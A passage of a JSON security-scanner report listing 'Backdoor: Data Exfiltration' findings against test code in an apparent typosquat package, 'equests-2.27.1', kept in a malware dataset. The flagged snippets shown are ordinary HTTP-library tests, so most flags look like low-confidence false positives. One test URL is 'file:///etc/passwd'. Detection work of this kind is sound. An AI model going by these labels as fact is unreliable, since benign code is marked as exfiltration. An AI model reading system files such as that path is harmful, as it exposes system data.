                    "text": "\n    def test_nonhttp_schemes_dont_check_URLs(self):\n        test_urls = (\n            'data:image/gif;base64,R0lGODlhAQABAHAAACH5BAUAAAAALAAAAAABAAEAAAICRAEAOw==',\n            'file:///etc/passwd',\n            'magnet:?xt=urn:btih:be08f00302bc2d1d3cfa3af02024fa647a271431',\n        )\n",
                    "rendered": {
                      "text": "\n    def test_nonhttp_schemes_dont_check_URLs(self):\n        test_urls = (\n            'data:image/gif;base64,R0lGODlhAQABAHAAACH5BAUAAAAALAAAAAABAAEAAAICRAEAOw==',\n            'file:///etc/passwd',\n            'magnet:?xt=urn:btih:be08f00302bc2d1d3cfa3af02024fa647a271431',\n        )\n",
                      "markdown": "`\n    def test_nonhttp_schemes_dont_check_URLs(self):\n        test_urls = (\n            'data:image/gif;base64,R0lGODlhAQABAHAAACH5BAUAAAAALAAAAAABAAEAAAICRAEAOw==',\n            'file:///etc/passwd',\n            'magnet:?xt=urn:btih:be08f00302bc2d1d3cfa3af02024fa647a271431',\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2587,
                  "startColumn": 20,
                  "endLine": 2587,
                  "endColumn": 25,
                  "snippet": {
                    "text": "          r = requests.post(httpbin('post'), json=data)\n\n    def test_json_decode_compatibility(self, httpbin):\n        r = requests.get(httpbin('bytes/20'))\n        with pytest.raises(requests.exceptions.JSONDecodeError):\n            r.json()\n",
                    "rendered": {
                      "text": "          r = requests.post(httpbin('post'), json=data)\n\n    def test_json_decode_compatibility(self, httpbin):\n        r = requests.get(httpbin('bytes/20'))\n        with pytest.raises(requests.exceptions.JSONDecodeError):\n            r.json()\n",
                      "markdown": "`          r = requests.post(httpbin('post'), json=data)\n\n    def test_json_decode_compatibility(self, httpbin):\n        r = requests.get(httpbin('bytes/20'))\n        with pytest.raises(requests.exceptions.JSONDecodeError):\n            r.json()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2584,
                  "startColumn": 22,
                  "endLine": 2584,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    def test_post_json_nan(self, httpbin):\n        data = {\"foo\": float(\"nan\")}\n        with pytest.raises(requests.exceptions.InvalidJSONError):\n          r = requests.post(httpbin('post'), json=data)\n\n    def test_json_decode_compatibility(self, httpbin):\n        r = requests.get(httpbin('bytes/20'))\n",
                    "rendered": {
                      "text": "    def test_post_json_nan(self, httpbin):\n        data = {\"foo\": float(\"nan\")}\n        with pytest.raises(requests.exceptions.InvalidJSONError):\n          r = requests.post(httpbin('post'), json=data)\n\n    def test_json_decode_compatibility(self, httpbin):\n        r = requests.get(httpbin('bytes/20'))\n",
                      "markdown": "`    def test_post_json_nan(self, httpbin):\n        data = {\"foo\": float(\"nan\")}\n        with pytest.raises(requests.exceptions.InvalidJSONError):\n          r = requests.post(httpbin('post'), json=data)\n\n    def test_json_decode_compatibility(self, httpbin):\n        r = requests.get(httpbin('bytes/20'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2577,
                  "startColumn": 20,
                  "endLine": 2577,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        Setting parameters for nonstandard schemes is allowed if those schemes\n        begin with \"http\", and is forbidden otherwise.\n        \"\"\"\n        r = requests.Request('GET', url=input, params=params)\n        p = r.prepare()\n        assert p.url == expected\n\n",
                    "rendered": {
                      "text": "        Setting parameters for nonstandard schemes is allowed if those schemes\n        begin with \"http\", and is forbidden otherwise.\n        \"\"\"\n        r = requests.Request('GET', url=input, params=params)\n        p = r.prepare()\n        assert p.url == expected\n\n",
                      "markdown": "`        Setting parameters for nonstandard schemes is allowed if those schemes\n        begin with \"http\", and is forbidden otherwise.\n        \"\"\"\n        r = requests.Request('GET', url=input, params=params)\n        p = r.prepare()\n        assert p.url == expected\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2543,
                  "startColumn": 20,
                  "endLine": 2543,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        any URL whose scheme doesn't begin with \"http\" is left alone, and\n        those whose scheme *does* begin with \"http\" are mutated.\n        \"\"\"\n        r = requests.Request('GET', url=input)\n        p = r.prepare()\n        assert p.url == expected\n\n",
                    "rendered": {
                      "text": "        any URL whose scheme doesn't begin with \"http\" is left alone, and\n        those whose scheme *does* begin with \"http\" are mutated.\n        \"\"\"\n        r = requests.Request('GET', url=input)\n        p = r.prepare()\n        assert p.url == expected\n\n",
                      "markdown": "`        any URL whose scheme doesn't begin with \"http\" is left alone, and\n        those whose scheme *does* begin with \"http\" are mutated.\n        \"\"\"\n        r = requests.Request('GET', url=input)\n        p = r.prepare()\n        assert p.url == expected\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2509,
                  "startColumn": 24,
                  "endLine": 2509,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    )\n    def test_redirecting_to_bad_url(self, httpbin, url, exception):\n        with pytest.raises(exception):\n            r = requests.get(httpbin('redirect-to'), params={'url': url})\n\n    @pytest.mark.parametrize(\n        'input, expected',\n",
                    "rendered": {
                      "text": "    )\n    def test_redirecting_to_bad_url(self, httpbin, url, exception):\n        with pytest.raises(exception):\n            r = requests.get(httpbin('redirect-to'), params={'url': url})\n\n    @pytest.mark.parametrize(\n        'input, expected',\n",
                      "markdown": "`    )\n    def test_redirecting_to_bad_url(self, httpbin, url, exception):\n        with pytest.raises(exception):\n            r = requests.get(httpbin('redirect-to'), params={'url': url})\n\n    @pytest.mark.parametrize(\n        'input, expected',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2497,
                  "startColumn": 20,
                  "endLine": 2497,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        )\n    )\n    def test_preparing_bad_url(self, url):\n        r = requests.Request('GET', url=url)\n        with pytest.raises(requests.exceptions.InvalidURL):\n            r.prepare()\n\n",
                    "rendered": {
                      "text": "        )\n    )\n    def test_preparing_bad_url(self, url):\n        r = requests.Request('GET', url=url)\n        with pytest.raises(requests.exceptions.InvalidURL):\n            r.prepare()\n\n",
                      "markdown": "`        )\n    )\n    def test_preparing_bad_url(self, url):\n        r = requests.Request('GET', url=url)\n        with pytest.raises(requests.exceptions.InvalidURL):\n            r.prepare()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2482,
                  "startColumn": 20,
                  "endLine": 2482,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                x = x.replace(c, c.upper())\n            return x\n        \n        r = requests.Request('GET', url=url)\n        p = r.prepare()\n        assert normalize_percent_encode(p.url) == expected\n\n",
                    "rendered": {
                      "text": "                x = x.replace(c, c.upper())\n            return x\n        \n        r = requests.Request('GET', url=url)\n        p = r.prepare()\n        assert normalize_percent_encode(p.url) == expected\n\n",
                      "markdown": "`                x = x.replace(c, c.upper())\n            return x\n        \n        r = requests.Request('GET', url=url)\n        p = r.prepare()\n        assert normalize_percent_encode(p.url) == expected\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2427,
                  "startColumn": 9,
                  "endLine": 2427,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    s.mount('http://', HTTPAdapter(pool_connections=0, pool_maxsize=0))\n\n    try:\n        s.get(httpbin('status/200'))\n    except ConnectionError as e:\n        assert u\"Pool is closed.\" in str(e)\n\n",
                    "rendered": {
                      "text": "    s.mount('http://', HTTPAdapter(pool_connections=0, pool_maxsize=0))\n\n    try:\n        s.get(httpbin('status/200'))\n    except ConnectionError as e:\n        assert u\"Pool is closed.\" in str(e)\n\n",
                      "markdown": "`    s.mount('http://', HTTPAdapter(pool_connections=0, pool_maxsize=0))\n\n    try:\n        s.get(httpbin('status/200'))\n    except ConnectionError as e:\n        assert u\"Pool is closed.\" in str(e)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2419,
                  "startColumn": 9,
                  "endLine": 2419,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    )))\n\n    with pytest.raises(RetryError):\n        s.get(httpbin('status/500'))\n\n\ndef test_urllib3_pool_connection_closed(httpbin):\n",
                    "rendered": {
                      "text": "    )))\n\n    with pytest.raises(RetryError):\n        s.get(httpbin('status/500'))\n\n\ndef test_urllib3_pool_connection_closed(httpbin):\n",
                      "markdown": "`    )))\n\n    with pytest.raises(RetryError):\n        s.get(httpbin('status/500'))\n\n\ndef test_urllib3_pool_connection_closed(httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2321,
                  "startColumn": 19,
                  "endLine": 2321,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\ndef test_requests_are_updated_each_time(httpbin):\n    session = RedirectSession([303, 307])\n    prep = requests.Request('POST', httpbin('post')).prepare()\n    r0 = session.send(prep)\n    assert r0.request.method == 'POST'\n    assert session.calls[-1] == SendCall((r0.request,), {})\n",
                    "rendered": {
                      "text": "\ndef test_requests_are_updated_each_time(httpbin):\n    session = RedirectSession([303, 307])\n    prep = requests.Request('POST', httpbin('post')).prepare()\n    r0 = session.send(prep)\n    assert r0.request.method == 'POST'\n    assert session.calls[-1] == SendCall((r0.request,), {})\n",
                      "markdown": "`\ndef test_requests_are_updated_each_time(httpbin):\n    session = RedirectSession([303, 307])\n    prep = requests.Request('POST', httpbin('post')).prepare()\n    r0 = session.send(prep)\n    assert r0.request.method == 'POST'\n    assert session.calls[-1] == SendCall((r0.request,), {})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2268,
                  "startColumn": 20,
                  "endLine": 2268,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    def test_encoded_methods(self, httpbin):\n        \"\"\"See: https://github.com/psf/requests/issues/2316\"\"\"\n        r = requests.request(b'GET', httpbin('get'))\n        assert r.ok\n\n\n",
                    "rendered": {
                      "text": "\n    def test_encoded_methods(self, httpbin):\n        \"\"\"See: https://github.com/psf/requests/issues/2316\"\"\"\n        r = requests.request(b'GET', httpbin('get'))\n        assert r.ok\n\n\n",
                      "markdown": "`\n    def test_encoded_methods(self, httpbin):\n        \"\"\"See: https://github.com/psf/requests/issues/2316\"\"\"\n        r = requests.request(b'GET', httpbin('get'))\n        assert r.ok\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2261,
                  "startColumn": 20,
                  "endLine": 2261,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        ))\n    def test_total_timeout_connect(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout:\n            pass\n",
                    "rendered": {
                      "text": "        ))\n    def test_total_timeout_connect(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout:\n            pass\n",
                      "markdown": "`        ))\n    def test_total_timeout_connect(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout:\n            pass\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2248,
                  "startColumn": 20,
                  "endLine": 2248,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        ))\n    def test_connect_timeout(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout as e:\n            assert isinstance(e, ConnectionError)\n",
                    "rendered": {
                      "text": "        ))\n    def test_connect_timeout(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout as e:\n            assert isinstance(e, ConnectionError)\n",
                      "markdown": "`        ))\n    def test_connect_timeout(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout as e:\n            assert isinstance(e, ConnectionError)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2236,
                  "startColumn": 20,
                  "endLine": 2236,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        ))\n    def test_read_timeout(self, httpbin, timeout):\n        try:\n            requests.get(httpbin('delay/10'), timeout=timeout)\n            pytest.fail('The recv() request should time out.')\n        except ReadTimeout:\n            pass\n",
                    "rendered": {
                      "text": "        ))\n    def test_read_timeout(self, httpbin, timeout):\n        try:\n            requests.get(httpbin('delay/10'), timeout=timeout)\n            pytest.fail('The recv() request should time out.')\n        except ReadTimeout:\n            pass\n",
                      "markdown": "`        ))\n    def test_read_timeout(self, httpbin, timeout):\n        try:\n            requests.get(httpbin('delay/10'), timeout=timeout)\n            pytest.fail('The recv() request should time out.')\n        except ReadTimeout:\n            pass\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2226,
                  "startColumn": 20,
                  "endLine": 2226,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n        \"\"\"\n        r = requests.get(httpbin('get'), timeout=timeout)\n        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n",
                    "rendered": {
                      "text": "        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n        \"\"\"\n        r = requests.get(httpbin('get'), timeout=timeout)\n        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n",
                      "markdown": "`        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n        \"\"\"\n        r = requests.get(httpbin('get'), timeout=timeout)\n        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2209,
                  "startColumn": 20,
                  "endLine": 2209,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        ))\n    def test_invalid_timeout(self, httpbin, timeout, error_text):\n        with pytest.raises(ValueError) as e:\n            requests.get(httpbin('get'), timeout=timeout)\n        assert error_text in str(e)\n\n    @pytest.mark.parametrize(\n",
                    "rendered": {
                      "text": "        ))\n    def test_invalid_timeout(self, httpbin, timeout, error_text):\n        with pytest.raises(ValueError) as e:\n            requests.get(httpbin('get'), timeout=timeout)\n        assert error_text in str(e)\n\n    @pytest.mark.parametrize(\n",
                      "markdown": "`        ))\n    def test_invalid_timeout(self, httpbin, timeout, error_text):\n        with pytest.raises(ValueError) as e:\n            requests.get(httpbin('get'), timeout=timeout)\n        assert error_text in str(e)\n\n    @pytest.mark.parametrize(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2198,
                  "startColumn": 20,
                  "endLine": 2198,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    def test_stream_timeout(self, httpbin):\n        try:\n            requests.get(httpbin('delay/10'), timeout=2.0)\n        except requests.exceptions.Timeout as e:\n            assert 'Read timed out' in e.args[0].args[0]\n\n",
                    "rendered": {
                      "text": "\n    def test_stream_timeout(self, httpbin):\n        try:\n            requests.get(httpbin('delay/10'), timeout=2.0)\n        except requests.exceptions.Timeout as e:\n            assert 'Read timed out' in e.args[0].args[0]\n\n",
                      "markdown": "`\n    def test_stream_timeout(self, httpbin):\n        try:\n            requests.get(httpbin('delay/10'), timeout=2.0)\n        except requests.exceptions.Timeout as e:\n            assert 'Read timed out' in e.args[0].args[0]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2062,
                  "startColumn": 18,
                  "endLine": 2062,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n    def test_update(self):\n        cid = CaseInsensitiveDict()\n",
                    "rendered": {
                      "text": "        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n    def test_update(self):\n        cid = CaseInsensitiveDict()\n",
                      "markdown": "`        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n    def test_update(self):\n        cid = CaseInsensitiveDict()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2061,
                  "startColumn": 18,
                  "endLine": 2061,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n    def test_update(self):\n",
                    "rendered": {
                      "text": "        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n    def test_update(self):\n",
                      "markdown": "`        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n    def test_update(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2060,
                  "startColumn": 18,
                  "endLine": 2060,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        cid['spam'] = 'oneval'\n        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n",
                    "rendered": {
                      "text": "        cid['spam'] = 'oneval'\n        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n",
                      "markdown": "`        cid['spam'] = 'oneval'\n        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2059,
                  "startColumn": 18,
                  "endLine": 2059,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        cid = CaseInsensitiveDict()\n        cid['spam'] = 'oneval'\n        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n",
                    "rendered": {
                      "text": "        cid = CaseInsensitiveDict()\n        cid['spam'] = 'oneval'\n        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n",
                      "markdown": "`        cid = CaseInsensitiveDict()\n        cid['spam'] = 'oneval'\n        cid['SPAM'] = 'blueval'\n        assert cid.get('spam') == 'blueval'\n        assert cid.get('SPAM') == 'blueval'\n        assert cid.get('sPam') == 'blueval'\n        assert cid.get('notspam', 'default') == 'default'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1989,
                  "startColumn": 19,
                  "endLine": 1989,
                  "endColumn": 24,
                  "snippet": {
                    "text": "                return None\n\n        session = CustomRedirectSession()\n        r = session.get(urls_test[0])\n        assert len(r.history) == 2\n        assert r.status_code == 200\n        assert r.history[0].status_code == 302\n",
                    "rendered": {
